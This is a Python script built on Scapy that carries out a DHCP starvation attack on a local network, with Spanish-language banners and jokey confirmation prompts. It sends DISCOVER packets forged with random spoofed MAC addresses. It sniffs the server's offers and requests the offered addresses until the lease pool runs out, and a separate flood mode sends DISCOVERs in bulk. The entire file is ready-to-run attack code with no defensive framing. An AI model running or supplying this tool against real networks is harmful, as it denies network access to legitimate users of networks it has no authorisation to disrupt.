#!/usr/bin/env python3

from scapy.all import *
import argparse
import sys
import os
import time

class DHCPStarvation:
    def __init__(self, interface):
        self.interface = interface
        self.lease_count = 0
        
    def random_mac(self):
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(f'{x:02x}' for x in mac)
    
    def send_discover(self, mac_addr):
        mac_bytes = bytes.fromhex(mac_addr.replace(':', ''))
        hw_addr = mac_bytes + b'\x00' * 10
        
        discover = (
            Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(
                op=1,
                chaddr=hw_addr,
                xid=random.randint(0, 0xFFFFFFFF),
                flags=0x8000
            ) /
            DHCP(options=[
                ("message-type", "discover"),
                ("hostname", f"victim-{mac_addr[-8:].replace(':', '')}"),
                ("param_req_list", [1, 3, 6, 15, 28, 51, 58]),
                "end"
            ])
        )
        
        sendp(discover, iface=self.interface, verbose=0)
        return discover
    
    def send_request(self, mac_addr, offered_ip, server_ip, xid):
        mac_bytes = bytes.fromhex(mac_addr.replace(':', ''))
        hw_addr = mac_bytes + b'\x00' * 10
        
        request = (
            Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(
                op=1,
                chaddr=hw_addr,
                xid=xid,
                flags=0x8000
            ) /
            DHCP(options=[
                ("message-type", "request"),
                ("server_id", server_ip),
                ("requested_addr", offered_ip),
                ("hostname", f"victim-{mac_addr[-8:].replace(':', '')}"),
                "end"
            ])
        )
        
        sendp(request, iface=self.interface, verbose=0)
        return request
    
    def process_offer(self, packet):
        if DHCP in packet and packet[DHCP].options[0][1] == 2:
            offered_ip = packet[BOOTP].yiaddr
            server_ip = packet[IP].src
            xid = packet[BOOTP].xid
            client_mac = ':'.join(f'{b:02x}' for b in packet[BOOTP].chaddr[:6])
            
            self.send_request(client_mac, offered_ip, server_ip, xid)
            self.lease_count += 1
            
            print(f"[+] LEASE #{self.lease_count} | IP: {offered_ip} | MAC: {client_mac} | Server: {server_ip}")
    
    def attack_mode_flood(self, count=100, delay=0.1):
        print("\n" + "="*70)
        print("MODO: DHCP DISCOVER FLOOD")
        print("="*70)
        print(f"Interfaz: {self.interface}")
        print(f"Paquetes: {count}")
        print(f"Delay: {delay}s\n")
        
        for i in range(count):
            mac = self.random_mac()
            self.send_discover(mac)
            print(f"[{i+1}/{count}] DISCOVER enviado - MAC: {mac}")
            time.sleep(delay)
        
        print(f"\n[OK] Flood completado: {count} DISCOVER enviados")
    
    def attack_mode_starve(self, duration=60):
        print("\n" + "="*70)
        print("MODO: DHCP STARVATION")
        print("="*70)
        print(f"Interfaz: {self.interface}")
        print(f"Duracion: {duration}s")
        print(f"\nPresiona Ctrl+C para detener\n")
        
        sniff_thread = AsyncSniffer(
            iface=self.interface,
            filter="udp and port 68",
            prn=self.process_offer,
            store=0
        )
        sniff_thread.start()
        
        start_time = time.time()
        discover_count = 0
        
        try:
            while time.time() - start_time < duration:
                mac = self.random_mac()
                self.send_discover(mac)
                discover_count += 1
                print(f"[*] DISCOVER #{discover_count} enviado - MAC: {mac}")
                time.sleep(0.5)
        
        except KeyboardInterrupt:
            print("\n\n[!] SE ACABO EL SUFRIMIENTO")
        
        finally:
            sniff_thread.stop()
            elapsed = time.time() - start_time
            
            print("\n" + "="*70)
            print("RESULTADO DEL DESORDEN QUE SE ISO")
            print("="*70)
            print(f"Tiempo: {elapsed:.2f}s")
            print(f"DISCOVER enviados: {discover_count}")
            print(f"IPs obtenidas: {self.lease_count}")
            if discover_count > 0:
                print(f"Tasa de exito: {(self.lease_count/discover_count*100):.2f}%")
            print("="*70)

def main():
    banner = """
    ======================================================================
              DHCP STARVATION ATTACK CUIDADOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
    ======================================================================
    """
    print(banner)
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', required=True)
    parser.add_argument('-m', '--mode', choices=['flood', 'starve'], default='starve')
    parser.add_argument('-c', '--count', type=int, default=100)
    parser.add_argument('-d', '--duration', type=int, default=60)
    parser.add_argument('-t', '--delay', type=float, default=0.1)
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[!] Requiere root")
        sys.exit(1)
    
    print("\n[!] SOLO CABRAS\n")
    
    response = input("DIGA SI, SI QUIERE METER CABRA Y NO SI ES DEL CLAN DE LOS GIRUGIRU? (yes/no): ")
    if response.lower() != 'yes':
        sys.exit(0)
    
    attacker = DHCPStarvation(args.interface)
    
    try:
        if args.mode == 'flood':
            attacker.attack_mode_flood(args.count, args.delay)
        else:
            attacker.attack_mode_starve(args.duration)
    except KeyboardInterrupt:
        print("\n[!] Interrumpido")
    except Exception as e:
        print(f"\n[!] ERROR: {e}")

if __name__ == "__main__":
    main()
